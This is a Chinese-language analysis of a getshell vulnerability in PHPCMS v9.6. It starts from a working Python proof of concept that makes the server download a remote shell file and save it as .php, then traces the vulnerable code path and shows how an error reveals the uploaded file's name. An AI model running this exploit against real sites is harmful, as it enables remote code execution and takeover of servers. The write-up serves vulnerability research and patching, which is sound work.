#phpcms v9.6 getshell 分析
>很纠结这篇文章应该怎么去写，因为如果从cms本身开始到发现漏洞的位置。我发现逻辑有点混乱，可能需要更多的技术沉淀吧，本文就从poc来定位漏洞位置吧

1.**POC**
```python
import re  
import requests


def poc(url):  
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '<img src=http://url/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)

    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        print shell
```
2.**Part 1 getshell分析**
1. 根据poc定位到```\root\phpcms\modules\member\index.php```里的register函数
2. 在该函数范围内未发现poc里的```info[content]```的直接赋值，只有下面这样的赋值，基本可以确定问题出在此处
```php
   if($member_setting['choosemodel']) {
        require_once CACHE_MODEL_PATH.'member_input.class.php';
        require_once CACHE_MODEL_PATH.'member_update.class.php';
        $member_input = new member_input($userinfo['modelid']);		
        $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
        $user_model_info = $member_input->get($_POST['info']);
```
3. 注意到上面倒数三行的代码，我们跟进```\phpcms\modules\memeber\fields\member_input.class.php```里的member_input类及get函数
```php
<?php
class member_input {
	var $modelid;
	var $fields;
	var $data;

    function __construct($modelid) {
		$this->db = pc_base::load_model('sitemodel_field_model');
		$this->db_pre = $this->db->db_tablepre;
		$this->modelid = $modelid;
		$this->fields = getcache('model_field_'.$modelid,'model');

		//初始化附件类
		pc_base::load_sys_class('attachment','',0);
		$this->siteid = param::get_cookie('siteid');
		$this->attachment = new attachment('content','0',$this->siteid);

    }

	function get($data) {
		$this->data = $data = trim_script($data);
		$model_cache = getcache('member_model', 'commons');
		$this->db->table_name = $this->db_pre.$model_cache[$this->modelid]['tablename'];

		$info = array();
		$debar_filed = array('catid','title','style','thumb','status','islink','description');
		if(is_array($data)) {
			foreach($data as $field=>$value) {
				if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
				$field = safe_replace($field);
				$name = $this->fields[$field]['name'];
				$minlength = $this->fields[$field]['minlength'];
				$maxlength = $this->fields[$field]['maxlength'];
				$pattern = $this->fields[$field]['pattern'];
				$errortips = $this->fields[$field]['errortips'];
				if(empty($errortips)) $errortips = "$name 不符合要求！";
				$length = empty($value) ? 0 : strlen($value);
				if($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
				if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在'.$field.'字段');
				if($maxlength && $length > $maxlength && !$isimport) {
					showmessage("$name 不得超过 $maxlength 个字符！");
				} else {
					str_cut($value, $maxlength);
				}
				if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
	            if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
				$func = $this->fields[$field]['formtype'];
				if(method_exists($this, $func)) $value = $this->$func($field, $value);
	
				$info[$field] = $value;
			}
		}
		return $info;
	}
}?>
```
注意到$this->fields在构造函数中定义为
```$this->fields = getcache('model_field_'.$modelid,'model');```
而在第二步中，mew member_input时传入的参数的赋值为
```$userinfo['modelid'] = isset($_POST['modelid']) ? intval($_POST['modelid']) : 10;```
这也解释了在poc控制modelid=1的原因，到此我们可以控制getcache的文件为```model_field_1.cache.php```
4. 跟进```root\caches\caches_model\caches_data\model_field_1.cache.php```与分析第三步的代码可知在poc中```info[content]```的情况下```$func = $this->fields[$field]['formtype'];```取到的值为```'formtype' => 'editor'```，而```if(method_exists($this, $func)) $value = $this->$func($field, $value);```等于```$value = editor($field,$value)```
5. 跟进```root\caches\caches_model\caches_data\member_input_class.php```
```php
function editor($field, $value) {
    $setting = string2array($this->fields[$field]['setting']);
    $enablesaveimage = $setting['enablesaveimage'];
    $site_setting = string2array($this->site_config['setting']);
    $watermark_enable = intval($site_setting['watermark_enable']);
    $value = $this->attachment->download('content', $value,$watermark_enable);
    return $value;
}
```
这里的```$field```,```$value```在第三步的代码中写的很清楚``foreach($data as $field=>$value)```,注意倒数第二行，这里也把content写死了
6. 跟进```\root\phpcms\libs\classes\attachment.class.php```里的```function download()```
```php
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
{
    global $image_d;
    $this->att_db = pc_base::load_model('attachment_model');
    $upload_url = pc_base::load_config('system','upload_url');
    $this->field = $field;
    $dir = date('Y/md/');
    $uploadpath = $upload_url.$dir;
    $uploaddir = $this->upload_root.$dir;
    $string = new_stripslashes($value);
    if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
    $remotefileurls = array();
    foreach($matches[3] as $matche)
    {
        if(strpos($matche, '://') === false) continue;
        dir_create($uploaddir);
        $remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
    }
```
这里只贴出了部分的代码，但涵盖了关键的位置，```if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;```这里这条正则匹配的是形如```href=http://evil.com/1.jpg```的以```.$ext```结尾的字符串，如果不匹配直接返回```value```
**PS:这里推荐[https://regex101.com/](https://regex101.com/)这个工具来分析正则（但是这个工具应该是还不完善，在分析正则的时候，好像都是一次性分析，比如用上面的正则直接去尝试的话，```\\2```会被解析为```\```和```2```这两个字符，而不是取到第二个括号里的```[\"|']?```，导致正则被曲解，所以如果用这个工具应该是些微```/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\2/i```）**

7. 在poc```<img src=http://url/shell.txt?.php#.jpg>```的前提下，我们可以不返回value，进入```function fillurl($surl, $absurl, $basehref = '')```，继续跟进
```php
function fillurl($surl, $absurl, $basehref = '') {
    if($basehref != '') {
        $preurl = strtolower(substr($surl,0,6));
        if($preurl=='http://' || $preurl=='ftp://' ||$preurl=='mms://' || $preurl=='rtsp://' || $preurl=='thunde' || $preurl=='emule://'|| $preurl=='ed2k://')
        return  $surl;
        else
        return $basehref.'/'.$surl;
    }
    $i = 0;
    $dstr = '';
    $pstr = '';
    $okurl = '';
    $pathStep = 0;
    $surl = trim($surl);
    if($surl=='') return '';
    $urls = @parse_url(SITE_URL);
    $HomeUrl = $urls['host'];
    $BaseUrlPath = $HomeUrl.$urls['path'];
    $BaseUrlPath = preg_replace("/\/([^\/]*)\.(.*)$/",'/',$BaseUrlPath);
    $BaseUrlPath = preg_replace("/\/$/",'',$BaseUrlPath);
    $pos = strpos($surl,'#');
    if($pos>0) $surl = substr($surl,0,$pos);
```
其功能也就是去除url中的锚点，所以poc中的```<img src=http://url/shell.txt?.php#.jpg>```会被处理为```<img src=http://url/shell.txt?.php>```
8. 继续向下 166行```$filename = fileext($file);```跟进```phpcms\libs\functions\global.func.php```

	```php
function fileext($filename) {
	return strtolower(trim(substr(strrchr($filename, '.'), 1, 10)));
}
```
发现直接取得路径的最后一个.php作为文件类型
9. 继续向下171行```$upload_func = $this->upload_func;```，
23行的构造方法中```$this->upload_func = 'copy';写死为copy```
168行```$filename = $this->getname($filename);```跟进
```php
function getname($fileext){
    return date('Ymdhis').rand(100, 999).'.'.$fileext;
}
```
发现文件被重命名为随机

3.**Part 2 报错分析**
>这个漏洞如果只是上面生成的随机文件，在利用上还是需要一定代价去爆破的，但是如果爆出文件名的话那就好利用多了

注册index里的150行```$this->db->insert($user_model_info);```，其插入的表结构
```mysql
mysql> describe v9_member_detail;
+----------+-----------------------+------+-----+---------+-------+
| Field    | Type                  | Null | Key | Default | Extra |
+----------+-----------------------+------+-----+---------+-------+
| userid   | mediumint(8) unsigned | NO   | PRI | 0       |       |
| birthday | date                  | YES  |     | NULL    |       |
+----------+-----------------------+------+-----+---------+-------+
2 rows in set (0.13 sec)
```
我们的字段不在其中，于是报错
4.**Part 3 测试结果**
运行poc（注意这里报错还有一个status>0的条件，如果不开启php_sso的话，可以自己改一下）
```shell
http://127.0.0.1/phpcms/install_package/uploadfile/2017/0419/20170419085014909.php
[Finished in 6.3s]
```